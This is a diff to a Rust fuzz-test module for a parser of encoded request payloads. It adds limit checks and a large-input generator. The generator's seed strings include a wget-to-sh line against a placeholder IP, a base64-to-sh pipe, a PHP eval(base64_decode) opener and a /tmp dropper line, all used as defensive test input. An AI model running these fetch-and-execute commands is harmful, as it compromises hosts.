@@ -190,7 +190,9 @@ mod tests {
         assert!(x.layers.len() <= MAX_LAYERS);
         assert!(x.pieces.len() <= MAX_PIECES);
         let decoded: usize = x.layers.iter().skip(1).map(|l| l.text.len()).sum();
-        assert!(decoded <= MAX_OUTPUT + MAX_LAYERS * 64, "{decoded}");
+        assert!(decoded <= MAX_OUTPUT, "{decoded}");
+        let steps: usize = x.recipes.iter().map(|r| count_steps(&r.nodes)).sum();
+        assert!(steps <= MAX_STEPS, "{steps}");
         for (i, l) in x.layers.iter().enumerate() {
             assert!(x.depth(i) <= MAX_DEPTH);
             if let Some(p) = l.parent {
@@ -203,10 +205,29 @@ mod tests {
         for p in &x.pieces {
             inside(x, p.at);
             assert!(p.value.len() <= MAX_VALUE);
+            assert!(p.url.as_ref().is_none_or(|u| u.len() <= MAX_VALUE));
+        }
+        // A piece holds at most MAX_URLS urls: the same value, with a url.
+        let mut urls = std::collections::HashMap::new();
+        for p in x.pieces.iter().filter(|p| p.url.is_some()) {
+            let n: &mut usize = urls.entry(&p.value).or_default();
+            *n += 1;
+            assert!(*n <= MAX_URLS, "{}", p.value);
         }
         for o in &x.opaque {
             inside(x, o.at);
         }
+    }
+
+    fn count_steps(nodes: &[Node]) -> usize {
+        nodes
+            .iter()
+            .map(|n| match n {
+                Node::Step(_) => 1,
+                Node::Pipe(inner) => count_steps(inner),
+                Node::Try { first, fallback } => count_steps(first) + count_steps(fallback),
+            })
+            .sum()
     }
 
     fn inside(x: &Xray, s: Span) {
@@ -232,12 +253,7 @@ mod tests {
             b"\xff\xfe",
             b"H4sIAAAAAAAA",
         ];
-        // Mostly short inputs, now and then one of the full 64 KiB.
-        let len = if rng.random_range(0..4000u16) == 0 {
-            rng.random_range(0..=64 * 1024usize)
-        } else {
-            rng.random_range(0..=96usize)
-        };
+        let len = rng.random_range(0..=96usize);
         let mode = rng.random_range(0..5u8);
         let mut out = Vec::with_capacity(len);
         while out.len() < len {
@@ -265,12 +281,59 @@ mod tests {
         out
     }
 
+    /// One large input, 4 KiB to 64 KiB, weighted towards nested base64
+    /// and gzip so the depth, layer and output limits are reached.
+    fn large_input(rng: &mut StdRng) -> Vec<u8> {
+        use std::io::Write;
+        let len = rng.random_range(4 * 1024..=64 * 1024usize);
+        let seed = [
+            "wget http://192.0.2.7/a.sh -O- | sh; ",
+            "echo ZXhhbXBsZQ== | base64 -d | sh; ",
+            "<?php eval(base64_decode('",
+            "cd /tmp || cd /var/tmp; chmod +x x; ./x ",
+        ];
+        let mut text = Vec::new();
+        while text.len() < len {
+            let n = rng.random_range(0..seed.len());
+            text.extend_from_slice(seed[n].as_bytes());
+            if rng.random_range(0..4u8) == 0 {
+                text.extend((0..rng.random_range(1..64usize)).map(|_| rng.random_range(0..=255u8)));
+            }
+        }
+        let mut out = text;
+        for _ in 0..rng.random_range(1..=8u8) {
+            out = match rng.random_range(0..4u8) {
+                0 => {
+                    let mut e =
+                        flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
+                    e.write_all(&out).unwrap();
+                    e.finish().unwrap()
+                }
+                1 => data_encoding::HEXLOWER.encode(&out).into_bytes(),
+                _ => data_encoding::BASE64.encode(&out).into_bytes(),
+            };
+            if out.len() > 64 * 1024 {
+                break;
+            }
+        }
+        // Several copies side by side reach the layer count.
+        if out.len() < 4 * 1024 {
+            out = out.repeat(4 * 1024 / out.len().max(1) + 1);
+        }
+        out.truncate(64 * 1024);
+        out
+    }
+
     #[test]
     fn arbitrary_bytes_never_panic() {
         let start = Instant::now();
         let mut rng = StdRng::seed_from_u64(0x5eed_0001);
-        for _ in 0..20_000 {
-            let bytes = input(&mut rng);
+        for i in 0..20_300 {
+            let bytes = if i < 20_000 {
+                input(&mut rng)
+            } else {
+                large_input(&mut rng)
+            };
             let x = parse(
                 Source::Request {
                     method: "POST",
@@ -298,7 +361,7 @@ mod tests {
             check(&u);
         }
         assert!(
-            start.elapsed() < Duration::from_secs(30),
+            start.elapsed() < Duration::from_secs(90),
             "{:?}",
             start.elapsed()
         );
